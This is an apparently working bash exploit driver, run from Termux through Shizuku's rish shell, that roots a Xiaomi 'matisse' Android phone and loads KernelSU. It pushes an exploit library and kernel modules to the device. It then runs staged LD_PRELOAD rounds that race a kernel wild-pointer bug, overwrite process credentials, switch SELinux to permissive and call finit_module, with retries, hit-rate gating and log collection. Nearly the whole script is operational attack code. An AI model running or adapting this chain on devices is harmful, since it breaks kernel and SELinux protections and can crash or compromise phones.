#!/data/data/com.termux/files/usr/bin/bash
# ============================================================================
# ksu_load.sh v4 — matisse 装载 kernelsu (2026-09-10, helmsman 修订)
#   v4: A1 修 R 轮 PSELECT_KO 指错模块(matisse->gki209); 开火期持续 sync 防 panic 丢证;
#   每阶段完成即回拉 raw; 每 boot 1 发纪律不变
#   ★ v3 修复: rish 必须用 -c / stdin 模式! 直接传 argv 是**静默无效**的
#     (实测: ./rish "id -u" 无输出 rc=0; ./rish -c "id -u" → 2000)
#   ★ 新增 rish 自检: 拿不到 2000 就直接退出, 不再静默空跑
#   ★ 纪律: 每 boot 只打 1 次 (WILDPTR_INCIDENT); 先重启, 开机 10 分钟后再跑
# 用法: bash ~/ksu_load.sh
# ============================================================================
set -u
H="$HOME"
KODIR="$H/matisse/bin/ksu"
PRE="$KODIR/preflight_gki209.ko"
KSU="$KODIR/kernelsu_gki209_v2.ko"
EXP="$H/matisse/bin/mt87/preload.so"
OUTD=/data/local/tmp
TS=$(date +%Y%m%d_%H%M%S)
LOGD="$H/ksu_load_logs_$TS"
RISH="$H/rish"
mkdir -p "$LOGD"
say(){ echo "[$(date +%H:%M:%S)] $*"; }

echo "=========================================================="
echo " matisse KSU 装载 (rish -c 模式 / 每 boot 1 发 / mt86 野指针修复)"
echo " 日志: $LOGD"
echo "=========================================================="
for f in "$PRE" "$KSU" "$EXP" "$RISH"; do [ -f "$f" ] || { echo "!! 缺文件: $f"; exit 1; }; done

# ---------- rish 层 (抄 ksu_hunt.sh 成熟做法 + 冷启动/超时/模式 三重加固) ----------
RISH_DIR="$H"
chmod +x "$RISH" 2>/dev/null
RISH_MODE="c"
rish_try(){ local cmd="$1" t="$2"
  if [ "$RISH_MODE" = "stdin" ]; then
    printf "%s\n" "$cmd" | (cd "$RISH_DIR" && timeout -k 5 "$t" ./rish) 2>&1
  else
    (cd "$RISH_DIR" && timeout -k 5 "$t" ./rish -c "$cmd" </dev/null) 2>&1
  fi; }
# 冷启动自检: 两种模式 x 5 轮, 每轮 10s 间隔 (Shizuku app 被冻结时首调会超时)
RISH_OK=0
say "rish 自检 (两种模式 x 5 轮, 首次可能慢, 别打断)..."
for attempt in 1 2 3 4 5; do
  for mode in c stdin; do
    RISH_MODE="$mode"
    WARM=$(rish_try "id -u" 90)
    W=$(printf "%s" "$WARM" | tr -d "\r\n ")
    if [ "$W" = "2000" ]; then RISH_OK=1; break 2; fi
    say "  第${attempt}轮 模式=${mode} 失败: $(printf "%s" "$WARM" | head -c 50)" >&2
  done
  [ "$attempt" -lt 5 ] && sleep 10
done
if [ "$RISH_OK" != "1" ]; then
  echo "!! rish 自检失败 (两种模式 x 5 轮都没拿到 uid=2000)"
  echo "   最后一次输出: [$(printf "%s" "$WARM" | head -c 120)]"
  echo "   排查: 1) Shizuku app 显示正在运行?  2) Termux+Shizuku 电池无限制?"
  echo "         3) 手动: cd ~ && ./rish -c 'id -u'  (应打印 2000)"
  exit 2
fi
say "rish OK (模式=$RISH_MODE, uid=2000, 第${attempt}轮成功)"
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4 5; do
    out=$(rish_try "$cmd" "$t")
    if ! printf "%s" "$out" | grep -qE "Request timeout|blocked by your system|Terminated"; then
      printf "%s\n" "$out"; return 0
    fi
    say "rish 闪断/超时 $i/5, 10s 后重试" >&2
    sleep 10
  done
  printf "%s\n" "$out"; return 1; }
rpush(){ local l="$1" r="$2" out i
  for i in 1 2 3 4 5; do
    out=$( (cd "$RISH_DIR" && timeout -k 5 180 ./rish -c "cat > $r") < "$l" 2>&1 )
    if ! printf "%s" "$out" | grep -qE "Request timeout|blocked by your system|Terminated"; then
      printf "%s\n" "$out"; return 0
    fi
    say "推送闪断 $i/5, 10s 后重试" >&2
    sleep 10
  done
  printf "%s\n" "$out"; return 1; }
# mt87: rsh1 别名 (fire() 用; 继承 rsh 的 5x 重试)
rsh1(){ rsh "$1" "${2:-280}"; }
# 二次自检: 确认输出通道真的通 (不只看 id)
ST2=$(rsh "cat /proc/sys/kernel/random/boot_id" 60 | tr -d "\r")
printf "%s" "$ST2" | grep -qE "^[0-9a-f]{8}-" || { echo "!! rish 二次自检失败 (boot_id 读不到: [$ST2])"; exit 2; }
say "rish 二次自检 OK (boot_id 可读)"



# ---------- 体检 ----------
BOOT=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d "\r")
ENF=$(rsh "getenforce" 20 | tr -d "\r")
UP=$(rsh "awk \"{print int(\$1)}\" /proc/uptime" 20 | tr -d "\r")
LOAD=$(rsh "cat /proc/loadavg" 20 | tr -d "\r" | cut -d" " -f1)
RES=$(rsh "pgrep -x sleep 2>/dev/null | wc -l" 20 | tr -d "\r ")
DCNT=$(rsh "for p in /proc/[0-9]*/stat; do awk \"{print \$3}\" \$p 2>/dev/null; done | grep -c '^D'" 25 | tr -d "\r ")
MODS=$(rsh "grep -cE '^(preflight|kernelsu)' /proc/modules 2>/dev/null" 20 | tr -d "\r ")
say "boot=$(printf "%s" "$BOOT" | cut -c1-8) enforce=$ENF uptime=${UP}s load=$LOAD 残留sleep=${RES:-?} D态=${DCNT:-?} 已载模块=${MODS:-0}"
[ "$ENF" = "Enforcing" ] || { echo "!! 当前 $ENF (应为 Enforcing) — 重启手机再跑"; exit 2; }
case "${UP:-x}" in ""|*[!0-9]*) echo "!! uptime 读不到"; exit 2;; esac
L=${LOAD%%.*}; case "$L" in ""|*[!0-9]*) L=99;; esac
# 本机 MIUI 基线负载 ~16 (16 核全饱和, 零残留实证) → 阈值放到 25; 真正的危险信号是 D 态进程
[ "$L" -le 25 ] || { echo "!! load=$LOAD >25 — 等凉下来再跑"; exit 2; }
[ "${RES:-0}" -le 2 ] || { echo "!! 残留 sleep 进程 ${RES} 个 — 先重启手机"; exit 2; }
# D 态进程含内核线程(kworker 等)属正常, 仅提示不拦截
[ "${MODS:-0}" -ge 1 ] && say "注意: /proc/modules 已有 preflight/kernelsu (上次没重启?)"

# ---------- 推文件 ----------
say "推送 preload.so(mt86) + kernelsu + preflight ..."
rpush "$EXP" "$OUTD/preload.so" >/dev/null
rpush "$KSU" "$OUTD/kernelsu_gki209.ko" >/dev/null
rpush "$PRE" "$OUTD/preflight_gki209.ko" >/dev/null
rsh "chmod 644 $OUTD/preload.so $OUTD/kernelsu_gki209.ko $OUTD/preflight_gki209.ko; sync" 30 >/dev/null
CHK=$(rsh "sha256sum $OUTD/preload.so $OUTD/kernelsu_gki209.ko $OUTD/preflight_gki209.ko" 30 | tr -d "\r")
echo "$CHK" | tee "$LOGD/device_sha256.txt"
echo "$CHK" | grep -q "$(sha256sum "$EXP" | cut -c1-16)" || { echo "!! preload SHA 不符 (传输损坏), 重跑一次"; exit 3; }
echo "$CHK" | grep -q "$(sha256sum "$KSU" | cut -c1-16)" || { echo "!! kernelsu SHA 不符, 重跑一次"; exit 3; }
say "SHA 校验通过"

# ---------- 开火机器 ----------
fire(){
  local name="$1" kind="$2" task="${3:-}" ko="${4:-}" cmd tskenv koflag
  tskenv=""; [ -n "$task" ] && tskenv="PSELECT_TASK=$task"
  koflag=""; [ -n "$ko" ] && koflag="PSELECT_KO=$ko"
  case "$kind" in
    R)   cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_KO=/data/local/tmp/kernelsu_gki209.ko PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
    E5)  cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
    C)   cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 $tskenv $koflag PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
    E5R) cmd="PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1";;
  esac
  say ">>> 开火 $name (约 4-5 分钟, 别动手机)"
  # v4: 设备端持续 sync (panic 丢 ext4 脏页=R1.out 蒸发根因); 幂等单实例
  SYNCUP=$(rsh "pgrep -f 'while :; do sync' | head -1" 20 2>/dev/null | tr -d '\r ')
  if [ -z "$SYNCUP" ]; then rsh "nohup sh -c 'while :; do sync; sleep 2; done' >/dev/null 2>&1 & echo sync-armed" 20 >/dev/null 2>&1; fi
  rsh1 "timeout 250 env $cmd LD_PRELOAD=$OUTD/preload.so /system/bin/sleep 180 > $OUTD/$name.out 2>&1" 280 \
    | tee "$LOGD/$name.tail" | grep -a "RC=\|ROOT-SEN\|finit_module\|UNPOISON\|resolver\|no symbol\|disagree" | tail -4
  say "$name 完成, enforce=$(rsh "getenforce" 20 | tr -d "\r")"
  # v4: 阶段产物即时回拉
  rsh "cat $OUTD/$name.out 2>/dev/null" 120 > "$LOGD/$name.raw.out" 2>/dev/null
  rsh "sync" 20 >/dev/null
}
gate(){ local st; st=$(rsh "cat $OUTD/mt49_child_status.txt" 30 | tr -d "\r")
  printf "%s" "$st" | grep -q "CapEff=0000000000000000" && { echo R_MISS; return; }
  printf "%s" "$st" | grep -q "task=" && { echo R_LANDED; return; }; echo R_MISS; }
gettask(){ rsh "cat $OUTD/mt49_child_status.txt" 30 | tr -d "\r" | grep -a "^task=" | tail -1 | cut -d= -f2 | cut -d" " -f1; }
hbfresh(){ local now mt; now=$(rsh "date +%s" 20 | tr -d "\r"); mt=$(rsh "stat -c %Y $OUTD/mt49_child_status.txt" 20 | tr -d "\r")
  case "$now$mt" in ""|*[!0-9]*) return 1;; esac; [ $((now-mt)) -le 30 ]; }

# ---------- R 轮: 本 boot 只打 1 次 ----------
rsh "pkill -9 -x sleep 2>/dev/null; rm -f $OUTD/mt49_child_status.txt $OUTD/root_alive.txt" 20 >/dev/null
fire R1 R "" ""
G=$(gate); say "R1: $G"
if [ "$G" != "R_LANDED" ]; then
  echo "!! R 没中 (命中率 10-25%). 按纪律: 本 boot 到此为止."
  echo "   重启手机 -> 开机 10 分钟后 -> 再跑一次 bash ~/ksu_load.sh"
  exit 5
fi
T=$(gettask); say "R 落地 task=$T"

# ---------- E5v3 permissive ----------
fire E5a E5 "" ""
hbfresh || { echo "!! child 心跳陈旧, 不打 C 轮"; exit 6; }
ENF=$(rsh "getenforce" 20 | tr -d "\r")
say "permissive: enforce=$ENF"
# v4.1: E5 未翻转 -> 再补一发 (E5b); 仍失败 -> 不白打 C 轮, 重启后重跑
if [ "$ENF" != "Permissive" ]; then
  say "E5a 未中 (enforce=$ENF) - 补发 E5b..."
  fire E5b E5 "" ""
  ENF=$(rsh "getenforce" 20 | tr -d "\r")
  say "E5b 后 enforce=$ENF"
  if [ "$ENF" != "Permissive" ]; then
    echo "!! E5 两发均未翻转 permissive - C(finit) 必败, 本 boot 到此为止 (重启后重跑 bash ~/ksu_load_v4.sh)"
    exit 7
  fi
fi

# ---------- C 轮: 装 kernelsu ----------
fire Cksu C "$T" "$OUTD/kernelsu_gki209.ko"
KSUM=$(rsh "grep -c ksu /proc/modules 2>/dev/null" 20 | tr -d "\r ")
rsh "dmesg 2>/dev/null | grep -aiE \"ksu|kernelsu\" | tail -15" 30 | tee "$LOGD/dmesg_ksu.txt"
say "kernelsu: /proc/modules=${KSUM:-0}"

# ---------- 失败才做 preflight 诊断 ----------
if [ "${KSUM:-0}" -lt 1 ]; then
  say "KSU 没装上 -> 同一窗口装 preflight 做加载器诊断 (零风险)"
  fire Cpre C "$T" "$OUTD/preflight_gki209.ko"
  PREMOD=$(rsh "grep -c ^preflight /proc/modules 2>/dev/null" 20 | tr -d "\r ")
  rsh "dmesg 2>/dev/null | grep -ai matisse-preflight | tail -5" 30 | tee "$LOGD/dmesg_preflight.txt"
  say "preflight: /proc/modules=${PREMOD:-0}"
  if [ "${PREMOD:-0}" -ge 1 ]; then
    say "=> 加载器/vermagic/CRC/CFI 全 OK, 问题在 KSU 自身初始化 (看 dmesg_ksu.txt)"
  else
    say "=> 连无害模块都装不上 => 加载器层面问题 (看 dmesg_preflight.txt)"
  fi
fi

# ---------- 还原 enforcing ----------
say "还原 enforcing ..."
fire E5R E5R "" ""
FIN=$(rsh "getenforce" 20 | tr -d "\r")

echo
echo "==================== 总结 ===================="
echo " R: $G  task=$T"
echo " kernelsu in /proc/modules: ${KSUM:-0}"
[ "${KSUM:-0}" -ge 1 ] && echo " ★★★ KSU 已加载 — 打开 KernelSU 管理器看是否转绿 ★★★"
echo " 最终 SELinux: $FIN  (若 Permissive: 重启一次即恢复)"
echo " 日志: $LOGD"
echo "=============================================="
